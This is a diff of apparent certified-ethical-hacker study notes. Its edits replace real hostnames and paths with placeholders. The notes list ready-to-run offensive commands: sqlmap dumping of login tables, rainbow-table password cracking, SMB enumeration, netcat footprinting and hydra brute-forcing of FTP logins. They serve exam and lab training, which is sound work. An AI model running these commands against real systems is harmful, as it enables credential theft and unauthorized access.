@@ -26,11 +26,11 @@ If even this the above command is not working then use this command-  namp -f 10
 				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
 i. Sqlmap -u www.example.com –cookie=”cookieValue” –dbs(enumerates DBs name(s) )
 ii. Then select a database and enumerate tables
-Sqlmap -u http://www.moviescope.com  –cookie=”value” -D goodshopping  --tables (enumerates tableNames)
-iii. Sqlmap -u www.goodshopping.com  –cookie=”value” -D goodshopping -T login –dump (will dump passwords to screen and enumerate one with loginID 6 will be availed in the process)\
+Sqlmap -u http://www.example.com  –cookie=”value” -D exampleDB  --tables (enumerates tableNames)
+iii. Sqlmap -u www.example.com  –cookie=”value” -D exampleDB -T login –dump (will dump passwords to screen and enumerate one with loginID 6 will be availed in the process)\
 
 i. Install the rainbow crack tool
-ii. Run rcrack on credentials-cloud.txt in the Documents folder
+ii. Run rcrack on EXAMPLE.txt in the Documents folder
 Run rcrack pathToRainbowTable.rf -l hases.txt 
 Use the credentials to login and reveal the bank account number
 7. use auxiliary/scanner/smb/smb_enumshares OR smb_enumusers; set RHOSTS  <target_ip >> run — enumerate SMB shares/users
@@ -42,7 +42,7 @@ Use the credentials to login and reveal the bank account number
 ```
 #  Quick Overview (Steganography) --> Snow , Openstego
 ```
-1- Hide Data Using Whitespace Stegnography- snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
+1- Hide Data Using Whitespace Stegnography- snow -C -m "My swiss account number is 111111111" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
 2- To Display Hidden Data- snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
 3- Image Stegnography using Openstego- PRACTICE ??
 ```
@@ -52,15 +52,15 @@ Use the credentials to login and reveal the bank account number
 ```
 #  Hacking Web Servers
 ```
-1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
+1- Footprinting web server Using Netcat and Telnet- nc -vv www.example.com 80
 						    GET /HTTP/1.0
-						    telnet www.movies.com 80
+						    telnet www.example.com 80
 						    GET /HTTP/1.0
 2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
 3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
 				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
 Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
-Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
+Now in terminal type-  hydra -L Username.txt -P Password.txt ftp://10.10.10.10
 
 hydra -l user -P passlist.txt ftp://10.10.10.10
 ```
